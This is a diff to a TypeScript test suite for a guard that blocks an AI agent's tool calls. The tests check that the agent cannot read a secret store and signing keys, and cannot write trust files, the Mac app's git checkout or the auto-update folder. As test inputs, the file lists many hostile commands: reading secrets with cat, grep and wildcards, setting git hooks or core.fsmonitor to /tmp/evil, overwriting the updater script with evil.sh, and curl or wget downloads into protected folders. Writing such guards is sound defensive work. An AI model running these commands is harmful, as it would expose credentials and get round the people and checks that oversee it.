@@ -661,6 +661,312 @@ describe('guard decisions', () => {
       expect(bash('talos-app relay status')).toBeUndefined()
     })
   })
+  describe('the secret files: <home>/secrets/ is never read, written or listed by a session', () => {
+    // with no keyring the secret store keeps its values as files here (secrets/store.ts, the file_0600 backend); a session reads
+    // them through `talos-app peer ...`, never raw
+    const f = join(home, 'secrets', 'peer-atlas.txt')
+    const read = (file_path: string, tool_name = 'Read') => guardDecision({ tool_name, tool_input: { file_path } }, cfg)
+    test('the file tools refuse a file under secrets/', () => {
+      for (const tool of ['Read', 'Write', 'Edit', 'MultiEdit']) expect(read(f, tool), tool).toBeDefined()
+      expect(read(join(home, 'secrets'), 'Read')).toBeDefined()
+      expect(read(join(home, 'media', '..', 'secrets', 'x'))).toBeDefined()
+    })
+    test('shell forms are refused: cat, cp, bun -e, ~, $TALOS_APP_HOME, a symlinked home, a bare name from inside', () => {
+      for (const c of [
+        `cat ${f}`,
+        `cp ${f} /tmp/x`,
+        `bun -e "console.log(require('fs').readFileSync('${f}','utf8'))"`,
+        `echo x > ${f}`,
+        `ls ${home}/secrets`,
+        'cat "$TALOS_APP_HOME/secrets/peer-atlas.txt"',
+        'cat ${TALOS_APP_HOME}/secrets/peer-atlas.txt',
+        `cd ${home} && cat secrets/peer-atlas.txt`,
+        `cd ${home}/secrets && cat peer-atlas.txt`,
+      ])
+        expect(bash(c), c).toBeDefined()
+      const rel = f.slice(userHome.length + 1)
+      expect(bash(`cat ~/${rel}`)).toBeDefined()
+      expect(bash(`cat $HOME/${rel}`)).toBeDefined()
+    })
+    test('relative paths from the home, above it or inside it are resolved against where the command runs', () => {
+      const bashAt = (command: string, cwd: string) =>
+        guardDecision({ tool_name: 'Bash', tool_input: { command }, cwd }, cfg)
+      mkdirSync(join(home, 'workers'), { recursive: true })
+      expect(bash('cd ~/.config && cat talos/secrets/x'), 'from above, ~/.config').toBeDefined()
+      expect(bash(`cd ${userHome}/.config && cat talos/secrets/x`), 'from above, spelled out').toBeDefined()
+      expect(bashAt('cat ../secrets/x', join(home, 'workers')), 'from workers/').toBeDefined()
+      expect(bashAt('cat secrets/x', home), 'cwd is the home').toBeDefined()
+      expect(bashAt('cat ./secrets/x', home), 'dot slash').toBeDefined()
+      expect(bashAt('cat x', join(home, 'secrets')), 'cwd inside secrets/').toBeDefined()
+      expect(bash(`cd ${home} && cat ../talos/secrets/x`), 'out and back in').toBeDefined()
+      expect(bashAt('cp -r secrets /tmp/x', home), 'the folder itself as an argument').toBeDefined()
+      expect(bashAt('cat bridge.key', home), 'a signing key by its bare name').toBeDefined()
+      expect(bashAt('cat ../bridge.key', join(home, 'workers')), 'a signing key from workers/').toBeDefined()
+    })
+    test('every probe on the review list is refused, wherever the pattern or the file sits in the line', () => {
+      const bashAt = (command: string, cwd: string) =>
+        guardDecision({ tool_name: 'Bash', tool_input: { command }, cwd }, cfg)
+      for (const c of [
+        'rg secrets secrets',
+        'grep -rv secrets secrets',
+        'grep -r -e. secrets',
+        'grep --regexp=. -r secrets',
+        'grep -r -- secrets',
+        'head bridge.key',
+        'tail bridge.key',
+        'less bridge.key.next',
+        'echo x > bridge.key',
+        'cat secr*/a',
+        'cat s*/a',
+        'cat secrets/a*',
+        'cat bridge.k*',
+        'find . -path ./secrets -prune',
+      ])
+        expect(bashAt(c, home), c).toBeDefined()
+      expect(bash(`cd ${home} && cat secr*/a`)).toBeDefined()
+      expect(bash('cd ~/.config/talos && cat secr*/a')).toBeDefined()
+      expect(bashAt('cat ../secr*/a', join(home, 'workers'))).toBeDefined()
+      expect(bash(`cat ${home}/secr*/a`)).toBeDefined()
+    })
+    test('echo secrets from the home is refused (accepted: a text guard cannot tell it from a path)', () => {
+      const bashAt = (command: string, cwd: string) =>
+        guardDecision({ tool_name: 'Bash', tool_input: { command }, cwd }, cfg)
+      expect(bashAt('echo secrets', home)).toBeDefined()
+      expect(bashAt('grep -n secrets/ config.json', home)).toBeDefined()
+    })
+    test("an agent's own folder with its own secrets/ is untouched", () => {
+      const agent = join(root, 'agent-work')
+      mkdirSync(join(agent, 'secrets'), { recursive: true })
+      const bashAt = (command: string, cwd: string) =>
+        guardDecision({ tool_name: 'Bash', tool_input: { command }, cwd }, cfg)
+      for (const c of [
+        'cat secrets/x',
+        'ls secrets',
+        'cp -r secrets /tmp/x',
+        'git add secrets/x',
+        'cat secr*/a',
+        'echo secrets',
+        'cat bridge.key',
+        'grep -rn token secrets',
+      ])
+        expect(bashAt(c, agent), c).toBeUndefined()
+      expect(bash('cd /tmp && cat talos/secrets/x')).toBeUndefined()
+      expect(bashAt('cat ../other/secrets/x', join(home, 'workers'))).toBeUndefined()
+      expect(bashAt('cat secrets-notes.txt', home)).toBeUndefined()
+    })
+    test('wildcards over a folder above the home stay allowed (ls ~/*, du -sh ~/*, ls /*, ls ~/.config/*, ls ../*)', () => {
+      const agent = join(root, 'agent-work')
+      mkdirSync(agent, { recursive: true })
+      const bashAt = (command: string, cwd: string) =>
+        guardDecision({ tool_name: 'Bash', tool_input: { command }, cwd }, cfg)
+      for (const c of ['ls ~/*', 'du -sh ~/*', 'ls /*', 'ls ~/.config/*', 'ls ../*', `ls ${userHome}/*`])
+        expect(bashAt(c, agent), c).toBeUndefined()
+      expect(bashAt('ls ../*', join(home, 'workers'))).toBeUndefined()
+      expect(bashAt('ls s*', home), 'a name prefix from the home is refused').toBeDefined()
+    })
+    test('secret-backend is read-only: readable, never written', () => {
+      const b = join(home, 'secret-backend')
+      expect(bash(`cat ${b}`)).toBeUndefined()
+      for (const c of [`echo file_0600 > ${b}`, `rm ${b}`, `cd ${home} && printf x > secret-backend`])
+        expect(bash(c), c).toBeDefined()
+      for (const tool of ['Write', 'Edit', 'MultiEdit']) expect(write(b, tool), tool).toBeDefined()
+    })
+    test('a symlinked home is refused too', () => {
+      const link = join(root, 'home-link')
+      rmSync(link, { force: true })
+      mkdirSync(home, { recursive: true })
+      symlinkSync(home, link)
+      expect(bash(`cat ${link}/secrets/peer-atlas.txt`)).toBeDefined()
+      expect(read(join(link, 'secrets', 'peer-atlas.txt'))).toBeDefined()
+      rmSync(link)
+    })
+    test('a wildcard that reaches the folder is refused', () => {
+      expect(bash(`cat ${home}/secr*/*`)).toBeDefined()
+    })
+    test('Grep and Glob inside the folder are refused', () => {
+      expect(read(join(home, 'secrets'), 'Grep')).toBeDefined()
+      expect(read(join(home, 'secrets'), 'Glob')).toBeDefined()
+    })
+    test('the rule is in the deny list', () => {
+      // the rules name the resolved home (macOS /tmp is /private/tmp), as every other deny rule does
+      const realSecrets = join(realpathSync(home), 'secrets')
+      expect(denyRules(cfg)).toContain(`Edit(/${realSecrets}/**)`)
+      expect(denyRules(cfg)).toContain(`Read(/${realSecrets}/**)`)
+    })
+    test('ordinary work stays allowed', () => {
+      expect(bash('ls secrets-of-the-trade')).toBeUndefined()
+      expect(bash('grep -rn secrets apps/bridge/src')).toBeUndefined()
+      expect(bash(`cd ${home} && cat config.json`)).toBeUndefined()
+      expect(bash('cd /tmp && cat secrets/x')).toBeUndefined()
+    })
+  })
+  describe('the read-only files by a relative name: no write from where the command runs, reads stay allowed', () => {
+    const bashAt = (command: string, cwd: string) =>
+      guardDecision({ tool_name: 'Bash', tool_input: { command }, cwd }, cfg)
+    test('a write by a bare name from the home is refused, each spelling', () => {
+      for (const c of [
+        'echo x > config.json',
+        'echo x >> relay-auto.json',
+        'echo x >| relay-auto.json',
+        'echo x &> config.json',
+        'echo x 2> config.json',
+        'echo x 1>config.json',
+        'echo x | tee relay-connect.json',
+        'echo x | tee -a relay-connect.json',
+        'cat <<< x > owner-folders.json',
+        'cp x owner-folders.json',
+        'mv x config.json',
+        'install x config.json',
+        'ln -sf x config.json',
+        'rsync x config.json',
+        'dd if=x of=config.json',
+        "sed -i 's/a/b/' config.json",
+        "perl -pi -e 's/a/b/' config.json",
+        'truncate -s 0 config.json',
+        'touch relay-auto.json',
+        'rm relay-auto.json',
+        'rm -f ./relay-auto.json',
+        'chmod 777 config.json',
+        'chown x config.json',
+        'echo x > devices.json',
+        'echo x > secret-backend',
+        'echo x > "config.json"',
+        "echo x > 'config.json'",
+        'echo x > conf"ig.json"',
+        'echo x > conf\\ig.json',
+        'echo x > conf*.json',
+        'cp x relay-a*',
+        'cp x relay-?uto.json',
+      ])
+        expect(bashAt(c, home), c).toBeDefined()
+    })
+    test('from above, below and by cd, and through a symlinked home', () => {
+      mkdirSync(join(home, 'workers'), { recursive: true })
+      expect(bashAt('cp x talos/relay-auto.json', join(userHome, '.config'))).toBeDefined()
+      expect(bash('cd ~/.config && cp x talos/relay-auto.json')).toBeDefined()
+      expect(bashAt('echo x > ../config.json', join(home, 'workers'))).toBeDefined()
+      expect(bashAt('echo x > ../../talos/config.json', join(home, 'workers'))).toBeDefined()
+      expect(bash(`cd ${home} && echo x > config.json`)).toBeDefined()
+      expect(bash(`cd ${home}/workers && echo x > ../relay-auto.json`)).toBeDefined()
+      const link = join(root, 'home-link-ro')
+      rmSync(link, { force: true })
+      symlinkSync(home, link)
+      expect(bashAt('echo x > config.json', link), 'cwd is the link').toBeDefined()
+      expect(bash(`cd ${link} && rm relay-auto.json`), 'cd into the link').toBeDefined()
+      rmSync(link)
+    })
+    test('a quoted or escaped > before a pipe does not hide the next command (the >| fix must not join commands)', () => {
+      for (const c of [
+        'echo "x>"|talos-app rotate',
+        'echo x\\>|talos-app enroll',
+        "echo 'a>'|talos-app rotate",
+        'echo "x>"|mv ~/.config /tmp/c',
+      ])
+        expect(bashAt(c, home), c).toBeDefined()
+      expect(bashAt('echo "x>"|tee config.json', home)).toBeDefined()
+    })
+    test('>&file is a file redirect; 2>&1 and >&2 are not', () => {
+      for (const c of [
+        'echo x >& config.json',
+        'echo x >&config.json',
+        'echo x &>config.json',
+        'echo x &>> relay-auto.json',
+      ])
+        expect(bashAt(c, home), c).toBeDefined()
+      for (const c of ['echo x 2>&1', 'echo x >&2', 'cat config.json 2>&1 | wc -l', 'echo x >&- '])
+        expect(bashAt(c, home), c).toBeUndefined()
+    })
+    test('a wildcard that leads, in the last segment, is matched as a glob against every read-only name', () => {
+      for (const c of [
+        'echo x > *-auto.json',
+        'echo x > ?onfig.json',
+        'echo x > [c]onfig.json',
+        'echo x | tee {config,x}.json',
+        'rm *',
+        'rm -f *.json',
+        'rm ./*auto.json',
+        'echo x > ./*auto.json',
+        'cp x relay-{auto,connect}.json',
+      ])
+        expect(bashAt(c, home), c).toBeDefined()
+      expect(bashAt('rm ../*auto.json', join(home, 'workers'))).toBeDefined()
+      expect(bashAt('rm *.txt', home), 'no read-only name matches').toBeUndefined()
+      expect(bashAt('echo x > *.log', home)).toBeUndefined()
+      expect(bashAt('rm *', join(root, 'agent-work'))).toBeUndefined()
+    })
+    test('a folder as the destination: the sources are judged by name, a recursive copy in is refused', () => {
+      for (const c of [
+        'cp /tmp/config.json .',
+        'cp /tmp/config.json ./',
+        'mv /tmp/x/relay-auto.json .',
+        'cp -t . /tmp/config.json',
+        'cp --target-directory=. /tmp/config.json',
+        'cp -r x/ .',
+        'cp -a x .',
+        'rsync -a x/ .',
+        'ln -s /tmp/config.json .',
+        'ln -sf /tmp/config.json',
+        'ln /tmp/config.json',
+        'cp /tmp/conf* .',
+      ])
+        expect(bashAt(c, home), c).toBeDefined()
+      expect(bashAt('cp /tmp/config.json ..', join(home, 'workers'))).toBeDefined()
+      expect(bashAt('cp /tmp/config.json talos', join(userHome, '.config'))).toBeDefined()
+      expect(bashAt('cp /tmp/notes.txt .', home)).toBeUndefined()
+      expect(bashAt('ln -s /tmp/notes.txt', home)).toBeUndefined()
+      expect(bashAt('cp /tmp/config.json .', join(home, 'workers', 'atlas'))).toBeUndefined()
+      expect(bashAt('cp /tmp/config.json .', join(root, 'agent-work'))).toBeUndefined()
+    })
+    test('a write to the launch files inside a quoted $(...), backticks or eval is still refused, as before', () => {
+      for (const c of [
+        `echo "$(echo x > ${home}/supervisor.json)"`,
+        `echo "\`echo x > ${home}/supervisor.json\`"`,
+        `eval 'echo x > ${home}/supervisor.json'`,
+        `eval "echo x > ${home}/launch/run.sh"`,
+      ])
+        expect(bash(c), c).toBeDefined()
+      expect(bashAt('echo "$(echo x > supervisor.json)"', home)).toBeDefined()
+      expect(bashAt("eval 'echo x > supervisor.json'", home)).toBeDefined()
+      expect(bashAt('cat supervisor.json', home)).toBeUndefined()
+    })
+    test('the refusal does not name the secret store backend file', () => {
+      expect(bashAt('echo x > config.json', home)?.deny).not.toContain('secret-backend')
+    })
+    test('a > inside quotes is not a redirect: echo ">" config.json from the home is allowed', () => {
+      expect(bashAt('echo ">" config.json', home)).toBeUndefined()
+      expect(bashAt("echo 'a > config.json'", home)).toBeUndefined()
+    })
+    test('reads stay allowed', () => {
+      for (const c of [
+        'cat config.json',
+        'grep x relay-auto.json',
+        'head -n 3 relay-connect.json',
+        'cat owner-folders.json | wc -l',
+      ])
+        expect(bashAt(c, home), c).toBeUndefined()
+      expect(bashAt('cat ../config.json', join(home, 'workers'))).toBeUndefined()
+      expect(bashAt('cat config.json > /tmp/copy.json', home), 'a read copied out').toBeUndefined()
+      expect(bashAt('cp config.json /tmp/copy.json', home), 'a copy out').toBeUndefined()
+    })
+    test("an agent's own config.json, and the name as a plain word, stay allowed", () => {
+      const agent = join(root, 'agent-work')
+      mkdirSync(agent, { recursive: true })
+      for (const c of [
+        'echo x > config.json',
+        'cp a config.json',
+        "sed -i 's/a/b/' config.json",
+        'rm relay-auto.json',
+        'echo x | tee config.json',
+        'echo x > conf*.json',
+      ])
+        expect(bashAt(c, agent), c).toBeUndefined()
+      expect(bashAt('echo config.json', home), 'a word that is not a write target').toBeUndefined()
+      expect(bashAt('echo x > config.json.bak', home)).toBeUndefined()
+      expect(bashAt('echo x > ../config.json', join(home, 'workers', 'atlas'))).toBeUndefined()
+      expect(bashAt('echo x > config.json', join(home, 'workers', 'atlas'))).toBeUndefined()
+      expect(bash('cd /tmp && echo x > config.json')).toBeUndefined()
+    })
+  })
   test('the Write tools are denied on the trust files too', () => {
     for (const f of ['devices.json', 'config.json', 'tripwire.writing', 'tripwire.json', 'guards/guards.json'])
       expect(write(join(home, f), 'Edit'), f).toBeDefined()
@@ -906,5 +1212,175 @@ describe('the guards reach every start', () => {
     runInstallGuards(install, ['--remove'], { out: (l) => out.push(l), err: () => {} })
     expect(out.join(' ')).toContain('Restart the agent now')
     expect(out.join(' ')).toContain('every tool call')
+  })
+})
+
+describe("the Mac app's own folder (app.talos.desktop): a session reads it, never writes it", () => {
+  // The app keeps its git checkout and its update files here. A session that could write
+  // .git/config, a hook or a ref there would get its code run by the updater (docs/SECURITY.md, updater trust).
+  const appDir = join(userHome, 'Library', 'Application Support', 'app.talos.desktop')
+  mkdirSync(join(appDir, 'checkout', '.git'), { recursive: true })
+  const viaLink = join(root, 'link-to-app')
+  symlinkSync(appDir, viaLink)
+  const spaced = (p: string) => p.replace(/ /g, ' ')
+
+  test('the file tools: Write, Edit, MultiEdit and NotebookEdit, however the path is spelled', () => {
+    const files = [
+      join(appDir, 'checkout', '.git', 'config'),
+      join(appDir, 'checkout', '.git', 'hooks', 'post-checkout'),
+      join(appDir, 'checkout', 'package.json'),
+      join(appDir, 'new-file'),
+      join(appDir, 'checkout', 'x', '..', '.git', 'HEAD'),
+      join(viaLink, 'checkout', '.git', 'config'),
+      '~/Library/Application Support/app.talos.desktop/checkout/.git/config',
+      join(userHome, 'LIBRARY', 'application support', 'App.Talos.Desktop', 'checkout', '.git', 'config'),
+    ]
+    for (const tool of ['Write', 'Edit', 'MultiEdit', 'NotebookEdit'])
+      for (const f of files) {
+        const input = tool === 'NotebookEdit' ? { notebook_path: f } : { file_path: f }
+        expect(guardDecision({ tool_name: tool, tool_input: input }, cfg), `${tool} ${f}`).toBeDefined()
+      }
+  })
+
+  test('reading stays allowed: the file tools that read, and shell commands that only read', () => {
+    for (const tool of ['Read', 'Grep', 'Glob'])
+      expect(
+        guardDecision({ tool_name: tool, tool_input: { file_path: join(appDir, 'checkout', '.git', 'config') } }, cfg),
+        tool,
+      ).toBeUndefined()
+    for (const c of [
+      `cat "${appDir}/checkout/package.json"`,
+      `ls -la "${appDir}"`,
+      `grep -r fsmonitor "${appDir}/checkout/.git/config"`,
+      `git -C "${appDir}/checkout" log -1`,
+      `git -C "${appDir}/checkout" status`,
+      `git -C "${appDir}/checkout" rev-parse HEAD`,
+      `git -C "${appDir}/checkout" diff HEAD`,
+      `git -C "${appDir}/checkout" branch --list`,
+      `cp "${appDir}/checkout/package.json" /tmp/copy.json`,
+      `cat ~/Library/Application Support/app.talos.desktop/checkout/package.json`,
+      `echo hello > /tmp/not-there.txt`,
+      `cp /tmp/a "${userHome}/Library/Application Support/Other/b"`,
+    ])
+      expect(bash(c), c).toBeUndefined()
+  })
+
+  test('shell commands that write there are refused: redirects, cp, mv, rm, tee, sed -i, an interpreter, git', () => {
+    for (const c of [
+      `echo x > "${appDir}/checkout/package.json"`,
+      `echo x >> ${spaced(appDir)}/checkout/.git/config`,
+      `echo x > ~/Library/Application Support/app.talos.desktop/checkout/.git/hooks/post-checkout`,
+      `echo x > "$HOME/Library/Application Support/app.talos.desktop/f"`,
+      `cp /tmp/x "${appDir}/checkout/.git/config"`,
+      `mv /tmp/x "${appDir}/checkout/.git/config"`,
+      `rm -rf "${appDir}/checkout"`,
+      `rm "${appDir}/checkout/package.json"`,
+      `echo x | tee "${appDir}/checkout/.git/config"`,
+      `sed -i '' s/a/b/ "${appDir}/checkout/.git/config"`,
+      `python3 -c "open('${appDir}/checkout/.git/config','w')"`,
+      `git -C "${appDir}/checkout" config core.fsmonitor /tmp/evil`,
+      `git -C "${appDir}/checkout" checkout --detach abc123`,
+      `git -C "${appDir}/checkout" reset --hard abc123`,
+      `git -C "${appDir}/checkout" update-ref refs/heads/main abc123`,
+      `git -C "${appDir}/checkout" commit -m x`,
+      `git -C "${appDir}/checkout" branch -f main abc123`,
+      `cd "${appDir}/checkout" && git checkout --detach abc123`,
+      `cd "${appDir}" && rm -rf checkout`,
+      `echo x > ${viaLink}/checkout/.git/config`,
+      `echo x > "${userHome}/LIBRARY/application support/APP.TALOS.DESKTOP/checkout/.git/config"`,
+      `git -C "${userHome}/library/application support/app.talos.desktop/checkout" config core.hooksPath /tmp/h`,
+    ])
+      expect(bash(c), c).toBeDefined()
+  })
+
+  test('the permission rule: one Edit( ) rule for the folder (and its contents), no lower-case copies', () => {
+    const real = realpathSync(userHome)
+    const folder = join(real, 'Library', 'Application Support', 'app.talos.desktop')
+    const rules = denyRules(cfg).filter((r) => r.toLowerCase().includes('app.talos.desktop'))
+    expect(rules.sort()).toEqual([`Edit(/${folder}/**)`, `Edit(/${folder})`].sort())
+  })
+})
+
+describe("the updater's working folder, <Talos home>/auto-update (the copied apply script bash runs, pending.json, check-now.json)", () => {
+  const dir = join(home, 'auto-update')
+  mkdirSync(dir, { recursive: true })
+  test('the file tools never write it, however the path is spelled', () => {
+    for (const tool of ['Write', 'Edit', 'MultiEdit', 'NotebookEdit'])
+      for (const f of [
+        join(dir, 'auto-update-apply.sh'),
+        join(dir, 'pending.json'),
+        join(dir, 'check-now.json'),
+        join(dir, 'x', '..', 'pending.json'),
+        join(home, 'AUTO-UPDATE', 'Pending.json'),
+      ]) {
+        const input = tool === 'NotebookEdit' ? { notebook_path: f } : { file_path: f }
+        expect(guardDecision({ tool_name: tool, tool_input: input }, cfg), `${tool} ${f}`).toBeDefined()
+      }
+  })
+  test('shell writes are refused, reads are not', () => {
+    for (const c of [
+      `echo x > "${dir}/pending.json"`,
+      `cp /tmp/evil.sh "${dir}/auto-update-apply.sh"`,
+      `mv /tmp/evil.sh ${dir}/auto-update-apply.sh`,
+      `sed -i "" s/a/b/ ${dir}/auto-update-apply.sh`,
+      `rm ${dir}/pending.json`,
+      'echo x > $TALOS_APP_HOME/auto-update/check-now.json',
+    ])
+      expect(bash(c), c).toBeDefined()
+    for (const c of [`cat "${dir}/pending.json"`, `ls -la ${dir}`, `cp ${dir}/pending.json /tmp/p.json`])
+      expect(bash(c), c).toBeUndefined()
+  })
+  test('one Edit( ) rule for it (and its contents), no lower-case copies', () => {
+    const rules = denyRules(cfg).filter((r) => r.toLowerCase().includes('/auto-update'))
+    const real = realpathSync(dir)
+    expect(rules.sort()).toEqual([`Edit(/${real}/**)`, `Edit(/${real})`].sort())
+  })
+})
+
+describe("more ways to write the app's folders: links, downloads, unpacking, cp -t, find, the data-volume spelling", () => {
+  const appDir = join(userHome, 'Library', 'Application Support', 'app.talos.desktop')
+  const dir = join(home, 'auto-update')
+  test('refused (a tripwire, not a fence)', () => {
+    for (const c of [
+      `ln "${appDir}/checkout/.git/config" /tmp/hard-link`,
+      `ln /tmp/x "${appDir}/checkout/.git/hooks/post-checkout"`,
+      `ln -s "${appDir}/checkout" /tmp/soft`,
+      `ln ${dir}/pending.json /tmp/p`,
+      `curl -o "${appDir}/checkout/.git/config" https://example.com/x`,
+      `curl --output ${dir}/auto-update-apply.sh https://example.com/x`,
+      `cd "${appDir}/checkout" && curl -O https://example.com/x`,
+      `wget -O "${appDir}/checkout/.git/config" https://example.com/x`,
+      `cd ${dir} && wget https://example.com/x`,
+      `tar -C "${appDir}" -xf /tmp/x.tar`,
+      `tar -xf /tmp/x.tar -C ${dir}`,
+      `cp -t "${appDir}/checkout" /tmp/a /tmp/b`,
+      `find "${appDir}/checkout" -name x -delete`,
+      `find ${dir} -exec rm {} +`,
+    ])
+      expect(bash(c), c).toBeDefined()
+    for (const c of [
+      `tar -C "${appDir}" -czf /tmp/o.tgz .`,
+      `find "${appDir}" -name x`,
+      'curl -o /tmp/y https://example.com/x',
+      'wget -O /tmp/y https://example.com/x',
+    ])
+      expect(bash(c), c).toBeUndefined()
+  })
+  test("macOS's other spelling of the same folder (/System/Volumes/Data) is the same folder", () => {
+    const mac = buildGuardConfig({
+      home: '/Users/alex/.config/talos/app',
+      checkout,
+      claudeHome,
+      userHome: '/Users/alex',
+    })
+    const folder = '/Users/alex/Library/Application Support/app.talos.desktop'
+    const data = `/System/Volumes/Data${folder}`
+    const w = (file_path: string) => guardDecision({ tool_name: 'Write', tool_input: { file_path } }, mac)
+    const b = (command: string) => guardDecision({ tool_name: 'Bash', tool_input: { command } }, mac)
+    expect(w(`${folder}/checkout/.git/config`)).toBeDefined()
+    expect(w(`${data}/checkout/.git/config`)).toBeDefined()
+    expect(b(`echo x > "${data}/checkout/.git/config"`)).toBeDefined()
+    expect(b(`rm -rf "${data}/checkout"`)).toBeDefined()
+    expect(b(`cat "${data}/checkout/package.json"`)).toBeUndefined()
   })
 })
